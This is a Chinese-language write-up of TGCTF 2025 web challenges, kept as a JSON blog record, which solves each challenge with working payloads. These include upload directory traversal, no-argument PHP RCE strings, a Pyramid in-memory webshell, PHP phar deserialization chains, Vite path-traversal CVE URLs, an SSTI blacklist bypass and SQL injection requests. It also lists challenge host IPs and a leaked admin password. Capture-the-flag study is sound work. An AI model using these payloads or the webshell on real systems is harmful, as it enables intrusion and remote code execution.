[{"content":"Web (ez)upload hint写有源码泄露\nindex.php.bak拿源码\n1\u0026lt;?php 2define(\u0026#39;UPLOAD_PATH\u0026#39;, __DIR__ . \u0026#39;/uploads/\u0026#39;); 3$is_upload = false; 4$msg = null; 5$status_code = 200; // 默认状态码为 200 6if (isset($_POST[\u0026#39;submit\u0026#39;])) { 7 if (file_exists(UPLOAD_PATH)) { 8 $deny_ext = array(\u0026#34;php\u0026#34;, \u0026#34;php5\u0026#34;, \u0026#34;php4\u0026#34;, \u0026#34;php3\u0026#34;, \u0026#34;php2\u0026#34;, \u0026#34;html\u0026#34;, \u0026#34;htm\u0026#34;, \u0026#34;phtml\u0026#34;, \u0026#34;pht\u0026#34;, \u0026#34;jsp\u0026#34;, \u0026#34;jspa\u0026#34;, \u0026#34;jspx\u0026#34;, \u0026#34;jsw\u0026#34;, \u0026#34;jsv\u0026#34;, \u0026#34;jspf\u0026#34;, \u0026#34;jtml\u0026#34;, \u0026#34;asp\u0026#34;, \u0026#34;aspx\u0026#34;, \u0026#34;asa\u0026#34;, \u0026#34;asax\u0026#34;, \u0026#34;ascx\u0026#34;, \u0026#34;ashx\u0026#34;, \u0026#34;asmx\u0026#34;, \u0026#34;cer\u0026#34;, \u0026#34;swf\u0026#34;, \u0026#34;htaccess\u0026#34;); 9 10 if (isset($_GET[\u0026#39;name\u0026#39;])) { 11 $file_name = $_GET[\u0026#39;name\u0026#39;]; 12 } else { 13 $file_name = basename($_FILES[\u0026#39;name\u0026#39;][\u0026#39;name\u0026#39;]); 14 } 15 $file_ext = pathinfo($file_name, PATHINFO_EXTENSION); 16 17 if (!in_array($file_ext, $deny_ext)) { 18 $temp_file = $_FILES[\u0026#39;name\u0026#39;][\u0026#39;tmp_name\u0026#39;]; 19 $file_content = file_get_contents($temp_file); 20 21 if (preg_match(\u0026#39;/.+?\u0026lt;/s\u0026#39;, $file_content)) { 22 $msg = \u0026#39;文件内容包含非法字符，禁止上传！\u0026#39;; 23 $status_code = 403; // 403 表示禁止访问 24 } else { 25 $img_path = UPLOAD_PATH . $file_name; 26 if (move_uploaded_file($temp_file, $img_path)) { 27 $is_upload = true; 28 $msg = \u0026#39;文件上传成功！\u0026#39;; 29 } else { 30 $msg = \u0026#39;上传出错！\u0026#39;; 31 $status_code = 500; // 500 表示服务器内部错误 32 } 33 } 34 } else { 35 $msg = \u0026#39;禁止保存为该类型文件！\u0026#39;; 36 $status_code = 403; // 403 表示禁止访问 37 } 38 } else { 39 $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; 40 $status_code = 404; // 404 表示资源未找到 41 } 42} 43 44// 设置 HTTP 状态码 45http_response_code($status_code); 46 47// 输出结果 48echo json_encode([ 49 \u0026#39;status_code\u0026#39; =\u0026gt; $status_code, 50 \u0026#39;msg\u0026#39; =\u0026gt; $msg, 51]); 审计一下代码，看到有个name，可以对文件名进行修改，想到目录穿越\n利用这个进行目录穿越，把.user.ini传到web目录，然后文件包含1.jpg\n连蚁剑拿flag\nAAA偷渡阴平 无参RCE\n1?tgctf2025=system(end(current(get_defined_vars())));\u0026amp;b=tac /flag AAA偷渡阴平（复仇） 利用session_id打无参RCE\n1/?tgctf2025=session_start();system(hex2bin(session_id())); 将cookie改为\n1PHPSESSID=636174202f662a 熟悉的配方，熟悉的味道 题目\n1from pyramid.config import Configurator 2from pyramid.request import Request 3from pyramid.response import Response 4from pyramid.view import view_config 5from wsgiref.simple_server import make_server 6from pyramid.events import NewResponse 7import re 8from jinja2 import Environment, BaseLoader 9 10eval_globals = { #防止eval执行恶意代码 11 \u0026#39;__builtins__\u0026#39;: {}, # 禁用所有内置函数 12 \u0026#39;__import__\u0026#39;: None # 禁止动态导入 13} 14 15 16def checkExpr(expr_input): 17 expr = re.split(r\u0026#34;[-+*/]\u0026#34;, expr_input) 18 print(exec(expr_input)) 19 20 if len(expr) != 2: 21 return 0 22 try: 23 int(expr[0]) 24 int(expr[1]) 25 except: 26 return 0 27 28 return 1 29 30 31def home_view(request): 32 expr_input = \u0026#34;\u0026#34; 33 result = \u0026#34;\u0026#34; 34 35 if request.method == \u0026#39;POST\u0026#39;: 36 expr_input = request.POST[\u0026#39;expr\u0026#39;] 37 if checkExpr(expr_input): 38 try: 39 result = eval(expr_input, eval_globals) 40 except Exception as e: 41 result = e 42 else: 43 result = \u0026#34;爬！\u0026#34; 44 45 46 template_str = 【xxx】 47 48 env = Environment(loader=BaseLoader()) 49 template = env.from_string(template_str) 50 rendered = template.render(expr_input=expr_input, result=result) 51 return Response(rendered) 52 53 54if __name__ == \u0026#39;__main__\u0026#39;: 55 with Configurator() as config: 56 config.add_route(\u0026#39;home_view\u0026#39;, \u0026#39;/\u0026#39;) 57 config.add_view(home_view, route_name=\u0026#39;home_view\u0026#39;) 58 app = config.make_wsgi_app() 59 60 server = make_server(\u0026#39;0.0.0.0\u0026#39;, 9040, app) 61 server.serve_forever() 审计一下发现在checkExpr处会将传入的内容用exec进行执行\n1def checkExpr(expr_input): 2 expr = re.split(r\u0026#34;[-+*/]\u0026#34;, expr_input) 3 print(exec(expr_input)) 4 5 if len(expr) != 2: 6 return 0 7 try: 8 int(expr[0]) 9 int(expr[1]) 10 except: 11 return 0 12 13 return 1 测一下发现题目不出网，打pyramid内存马\n参考\nhttps://forum.butian.net/share/3974\n1def waff(): 2 def f(): 3 yield g.gi_frame.f_back 4 5 g = f() 6 frame = next(g) 7 b = frame.f_back.f_back.f_globals 8 def hello(request): 9 code = request.params[\u0026#39;code\u0026#39;] 10 res=eval(code) 11 return Response(res) 12 13 config.add_route(\u0026#39;shellb\u0026#39;, \u0026#39;/shellb\u0026#39;) 14 config.add_view(hello, route_name=\u0026#39;shellb\u0026#39;) 15 config.commit() 16 17waff() 在/shellb处命令执行拿flag即可\n什么文件上传？ robots.txt里面看到一个class.php\n/class.php\nphp反序列化\nexp\n1\u0026lt;?php 2class yesterday { 3 public $learn; 4 public $study=\u0026#34;study\u0026#34;; 5 public $try; 6} 7class today { 8 public $doing; 9 public $did; 10 public $done; 11} 12class future{ 13 private $impossible=\u0026#34;How can you get here?\u0026lt;br\u0026gt;\u0026#34;; 14 private $out; 15 private $no; 16} 17$a = new yesterday(); 18$a -\u0026gt; study = new today(); 19$a -\u0026gt; study -\u0026gt; doing = new future(); 20 21 22echo base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(serialize($a)))))); 23 24?\u0026gt; 传入时会截断后4位，随便在后面加几个字符串就好\n接下来wow传参RCE拿flag就行\n什么文件上传？（复仇） 上一题可以拿到upload.php的源码\n1\u0026lt;?php 2if(isset($_FILES[\u0026#39;file\u0026#39;])) { 3 $uploadDir = \u0026#39;uploads/\u0026#39;; 4 if(!file_exists($uploadDir)) { 5 mkdir($uploadDir, 0777, true); 6 } 7 8 // 白名单允许的扩展名 9 $allowedExtensions = [\u0026#39;atg\u0026#39;]; 10 $fileName = basename($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]); 11 $fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION)); 12 13 // 检查文件扩展名 14 if(!in_array($fileExtension, $allowedExtensions)) { 15 die(\u0026#34;hacker！\u0026#34;); 16 } 17 18 $uploadFile = $uploadDir . $fileName; 19 20 if(move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], $uploadFile)) { 21 echo \u0026#34;文件已保存到：$uploadFile ！\u0026#34;; 22 } else { 23 echo \u0026#34;文件保存出错！\u0026#34;; 24 } 25} 26?\u0026gt; class.php\n1\u0026lt;?php 2highlight_file(__FILE__); 3error_reporting(0); 4function best64_decode($str) 5{ 6 return base64_encode(md5(base64_encode(md5($str)))); 7 } 8class yesterday { 9 public $learn; 10 public $study=\u0026#34;study\u0026#34;; 11 public $try; 12 public function __construct() 13 { 14 $this-\u0026gt;learn = \u0026#34;learn\u0026lt;br\u0026gt;\u0026#34;; 15 } 16 public function __destruct() 17 { 18 echo \u0026#34;You studied hard yesterday.\u0026lt;br\u0026gt;\u0026#34;; 19 return $this-\u0026gt;study-\u0026gt;hard(); 20 } 21} 22class today { 23 public $doing; 24 public $did; 25 public $done; 26 public function __construct(){ 27 $this-\u0026gt;did = \u0026#34;What you did makes you outstanding.\u0026lt;br\u0026gt;\u0026#34;; 28 } 29 public function __call($arg1, $arg2) 30 { 31 $this-\u0026gt;done = \u0026#34;And what you\u0026#39;ve done has given you a choice.\u0026lt;br\u0026gt;\u0026#34;; 32 echo $this-\u0026gt;done; 33 if(md5(md5($this-\u0026gt;doing))==666){ 34 return $this-\u0026gt;doing(); 35 } 36 else{ 37 return $this-\u0026gt;doing-\u0026gt;better; 38 } 39 } 40} 41class tommoraw { 42 public $good; 43 public $bad; 44 public $soso; 45 public function __invoke(){ 46 $this-\u0026gt;good=\u0026#34;You\u0026#39;ll be good tommoraw!\u0026lt;br\u0026gt;\u0026#34;; 47 echo $this-\u0026gt;good; 48 } 49 public function __get($arg1){ 50 $this-\u0026gt;bad=\u0026#34;You\u0026#39;ll be bad tommoraw!\u0026lt;br\u0026gt;\u0026#34;; 51 } 52 53} 54class future{ 55 private $impossible=\u0026#34;How can you get here?\u0026lt;br\u0026gt;\u0026#34;; 56 private $out; 57 private $no; 58 public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20; 59 60 public function __set($arg1, $arg2) { 61 if ($this-\u0026gt;out-\u0026gt;useful7) { 62 echo \u0026#34;Seven is my lucky number\u0026lt;br\u0026gt;\u0026#34;; 63 system(\u0026#39;whoami\u0026#39;); 64 } 65 } 66 public function __toString(){ 67 echo \u0026#34;This is your future.\u0026lt;br\u0026gt;\u0026#34;; 68 system($_POST[\u0026#34;wow\u0026#34;]); 69 return \u0026#34;win\u0026#34;; 70 } 71 public function __destruct(){ 72 $this-\u0026gt;no = \u0026#34;no\u0026#34;; 73 return $this-\u0026gt;no; 74 } 75} 76if (file_exists($_GET[\u0026#39;filename\u0026#39;])){ 77 echo \u0026#34;Focus on the previous step!\u0026lt;br\u0026gt;\u0026#34;; 78} 79else{ 80 $data=substr($_GET[\u0026#39;filename\u0026#39;],0,-4); 81 unserialize(best64($data)); 82} 83// You learn yesterday, you choose today, can you get to your future? 84?\u0026gt; 这题把直接反序列化写死了\n但是我们可以利用file_exists和文件上传打phar反序列化\n拿上一题的exp改一改\n1\u0026lt;?php 2class yesterday { 3 public $learn; 4 public $study=\u0026#34;study\u0026#34;; 5 public $try; 6} 7class today { 8 public $doing; 9 public $did; 10 public $done; 11} 12class future{ 13 private $impossible=\u0026#34;How can you get here?\u0026lt;br\u0026gt;\u0026#34;; 14 private $out; 15 private $no; 16} 17$a = new yesterday(); 18$a -\u0026gt; study = new today(); 19$a -\u0026gt; study -\u0026gt; doing = new future(); 20 21$phar = new Phar(\u0026#34;1.phar\u0026#34;); 22$phar-\u0026gt;startBuffering(); 23$phar-\u0026gt;setStub(\u0026#34;\u0026lt;php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //设置stub 24$phar-\u0026gt;setMetadata($a); //将自定义meta-data存入manifest 25$phar-\u0026gt;addFromString(\u0026#34;a\u0026#34;, \u0026#34;\u0026#34;); //添加要压缩的文件 26$phar-\u0026gt;stopBuffering(); 27 28?\u0026gt; 改为1.atg文件上传到uploads目录\n在class.php处传入\n1?filename=phar://./uploads/1.atg 实现RCE\n前端GAME CVE-2025-30208\n1URL/@fs/tgflagggg?import\u0026amp;raw?? 前端GAME Plus CVE-2025-31125\n1URL/@fs/tgflagggg?meteorkai.svg?.wasm?init 前端GAME Ultra https://mp.weixin.qq.com/s/HMhzXqSplWa-IwpftxwTiA\nCVE-2025-32395\n1curl --request-target /@fs/app/#/../../../../../tgflagggg URL TG_wordpress 在robots.txt里面看到这两个\n/.tmp/vuln和/.tmp/.bak\n一个二进制文件和一个fscan的扫描结果\n1fscan.exe -h 101.37.149.223 -ping 2 3 ___ _ 4 / _ \\ ___ ___ _ __ __ _ ___| | __ 5 / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / 6/ /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; 7\\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ 8 fscan version: 1.8.4 9start infoscan 10101.37.149.223:22 open 11101.37.149.223:80 open 12101.37.149.223:443 open 13101.37.149.223:3306 open 14101.37.149.223:27645 open 15101.37.149.223:27646 open 16101.37.149.223:27647 open 17101.37.149.223:27648 open 18101.37.149.223:27649 open 19101.37.149.223:27650 open 20101.37.149.223:27651 open 21101.37.149.223:27652 open 22101.37.149.223:27653 open 23101.37.149.223:27654 open 24101.37.149.223:27655 open 25101.37.149.223:27656 open 26101.37.149.223:27657 open 27101.37.149.223:27658 open 28101.37.149.223:27659 open 29101.37.149.223:27660 open 30101.37.149.223:27661 open 31101.37.149.223:27662 open 32101.37.149.223:33376 open 33101.37.149.223:52013 open 猜到要打pwn\nnc 101.37.149.223 52013\n验证猜想\n静态编译，而且主函数只有一个get\n直接ROPgadget\u0026ndash;ropchain梭哈\n1================================== + HINT(not flag/FLAG): + username/password: + TG_wordpressor + aXx^oV@K\u0026amp;cFoVaztQ* + + All hints have the same content + obtaining one is enough ================================== 拿到后台账户密码\nTG_wordpressor/aXx^oV@K\u0026amp;cFoVaztQ*\n登进后台找到插件列表 wp-file-manager版本为6.0\nhttps://blog.csdn.net/hongduilanjun/article/details/132851717\n1tgctf{CVE-2020-25213} 火眼辩魑魅 tgshell.php\n直接连蚁剑读flag了\n直面天命 把路由爆破出来，/aazz\n直接读flag即可\n1?filename=/flag 2//TGCTF{05ee064a-ef29-6e6c-718e-746b002f727e} 直面天命（复仇） 源码\n1import os 2import string 3from flask import Flask, request, render_template_string, jsonify, send_from_directory 4from a.b.c.d.secret import secret_key 5 6app = Flask(__name__) 7 8black_list=[\u0026#39;lipsum\u0026#39;,\u0026#39;|\u0026#39;,\u0026#39;%\u0026#39;,\u0026#39;{\u0026#39;,\u0026#39;}\u0026#39;,\u0026#39;map\u0026#39;,\u0026#39;chr\u0026#39;, \u0026#39;value\u0026#39;, \u0026#39;get\u0026#39;, \u0026#34;url\u0026#34;, \u0026#39;pop\u0026#39;,\u0026#39;include\u0026#39;,\u0026#39;popen\u0026#39;,\u0026#39;os\u0026#39;,\u0026#39;import\u0026#39;,\u0026#39;eval\u0026#39;,\u0026#39;_\u0026#39;,\u0026#39;system\u0026#39;,\u0026#39;read\u0026#39;,\u0026#39;base\u0026#39;,\u0026#39;globals\u0026#39;,\u0026#39;_.\u0026#39;,\u0026#39;set\u0026#39;,\u0026#39;application\u0026#39;,\u0026#39;getitem\u0026#39;,\u0026#39;request\u0026#39;, \u0026#39;+\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;arg\u0026#39;, \u0026#39;config\u0026#39;, \u0026#39;app\u0026#39;, \u0026#39;self\u0026#39;] 9def waf(name): 10 for x in black_list: 11 if x in name.lower(): 12 return True 13 return False 14def is_typable(char): 15 # 定义可通过标准 QWERTY 键盘输入的字符集 16 typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace 17 return char in typable_chars 18 19@app.route(\u0026#39;/\u0026#39;) 20def home(): 21 return send_from_directory(\u0026#39;static\u0026#39;, \u0026#39;index.html\u0026#39;) 22 23@app.route(\u0026#39;/jingu\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 24def greet(): 25 template1=\u0026#34;\u0026#34; 26 template2=\u0026#34;\u0026#34; 27 name = request.form.get(\u0026#39;name\u0026#39;) 28 template = f\u0026#39;{name}\u0026#39; 29 if waf(name): 30 template = \u0026#39;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹 31\u0026#39; 32 else: 33 k=0 34 for i in name: 35 if is_typable(i): 36 continue 37 k=1 38 break 39 if k==1: 40 if not (secret_key[:2] in name and secret_key[2:]): 41 template = \u0026#39;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧 42 43再去西行历练历练 44\u0026#39; 45 return render_template_string(template) 46 template1 = \u0026#34;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“{{}}” 47最后，如果你用了cat，就可以见到齐天大圣了 48\u0026#34; 49 template= template.replace(\u0026#34;天命\u0026#34;,\u0026#34;{{\u0026#34;).replace(\u0026#34;难违\u0026#34;,\u0026#34;}}\u0026#34;) 50 template = template 51 if \u0026#34;cat\u0026#34; in template: 52 template2 = \u0026#39; 53或许你这只叫天命人的猴子，真的能做到？ 54\u0026#39; 55 try: 56 return template1+render_template_string(template)+render_template_string(template2) 57 except Exception as e: 58 error_message = f\u0026#34;500报错了，查询语句如下： 59{template}\u0026#34; 60 return error_message, 400 61 62@app.route(\u0026#39;/hint\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 63def hinter(): 64 template=\u0026#34;hint： 65有一个aazz路由，去那里看看吧，天命人!\u0026#34; 66 return render_template_string(template) 67 68@app.route(\u0026#39;/aazz\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 69def finder(): 70 with open(__file__, \u0026#39;r\u0026#39;) as f: 71 source_code = f.read() 72 return f\u0026#34; 73{source_code} 74\u0026#34;, 200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/html; charset=utf-8\u0026#39;} 75 76if __name__ == \u0026#39;__main__\u0026#39;: 77 app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=80) 打ssti\npayload\n1天命((cycler.next[\u0026#34;\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f\u0026#34;][\u0026#34;\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\u0026#34;][\u0026#34;\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\u0026#34;](\u0026#39;o\u0026#39;\u0026#39;s\u0026#39;))[\u0026#39;p\u0026#39;\u0026#39;open\u0026#39;](\u0026#39;cat /flag\u0026#39;))[\u0026#39;r\u0026#39;\u0026#39;ead\u0026#39;]()难违 TGCTF 2025 后台管理 题目给了后台的一个账号，tg/tg123\n进后台发现什么都没有，甚至可以直接在cookie改身份\n回到登录界面尝试万能密码发现有waf，那应该要打sql\nwaf了单引号,通过转义绕过即可\n1username=admin\\\u0026amp;password=or 1=1# 尝试联合注入，set-cookie处有回显\n但是有长度限制，在读表名处卡了很久\n后面直接猜表名是flag，直接打无列名\nhttps://www.cnblogs.com/q1stop/p/18024992\n利用join打无列名\n1POST /login HTTP/1.1 2Host: 124.71.147.99:9045 3Accept-Language: zh-CN,zh;q=0.9 4Content-Type: application/x-www-form-urlencoded 5Cache-Control: max-age=0 6Origin: http://124.71.147.99:9045 7User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 8Referer: http://124.71.147.99:9045/login 9Accept-Encoding: gzip, deflate 10Upgrade-Insecure-Requests: 1 11Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 12Content-Length: 25 13 14username=admin\\\u0026amp;password={{urlenc(union select * from (select * from flag a join flag b)c#)}} 1POST /login HTTP/1.1 2Host: 124.71.147.99:9045 3Accept-Language: zh-CN,zh;q=0.9 4Content-Type: application/x-www-form-urlencoded 5Cache-Control: max-age=0 6Origin: http://124.71.147.99:9045 7User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 8Referer: http://124.71.147.99:9045/login 9Accept-Encoding: gzip, deflate 10Upgrade-Insecure-Requests: 1 11Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 12Content-Length: 25 13 14username=admin\\\u0026amp;password={{urlenc(union select value,2 from flag#)}} 1TGCTF{ac4ca16f-f1508c-000342} ","permalink":"http://localhost:1313/post/tgctf_2025/","summary":"\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"ezupload\"\u003e\u003cstrong\u003e(ez)upload\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003ehint写有源码泄露\u003c/p\u003e\n\u003cp\u003eindex.php.bak拿源码\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 1\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u0026lt;?php\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 2\u003c/span\u003e\u003cspan class=\"cl\"\u003edefine\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;UPLOAD_PATH\u0026#39;\u003c/span\u003e, __DIR__ . \u003cspan class=\"s1\"\u003e\u0026#39;/uploads/\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 3\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$is_upload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e false\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 4\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$msg\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e null\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 5\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$status_code\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 200\u003cspan class=\"p\"\u003e;\u003c/span\u003e // 默认状态码为 \u003cspan class=\"m\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 6\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eisset\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$_POST\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;submit\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 7\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003efile_exists\u003cspan class=\"o\"\u003e(\u003c/span\u003eUPLOAD_PATH\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 8\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$deny_ext\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e array\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;php\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;php5\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;php4\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;php3\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;php2\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;html\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;htm\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;phtml\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;pht\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;jsp\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;jspa\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;jspx\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;jsw\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;jsv\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;jspf\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;jtml\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;asp\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;aspx\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;asa\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;asax\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;ascx\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;ashx\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;asmx\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;cer\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;swf\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;htaccess\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 9\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e10\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eisset\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e11\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003e$file_name\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e12\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e13\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003e$file_name\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e basename\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$_FILES\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e])\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e14\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e15\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$file_ext\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e pathinfo\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$file_name\u003c/span\u003e, 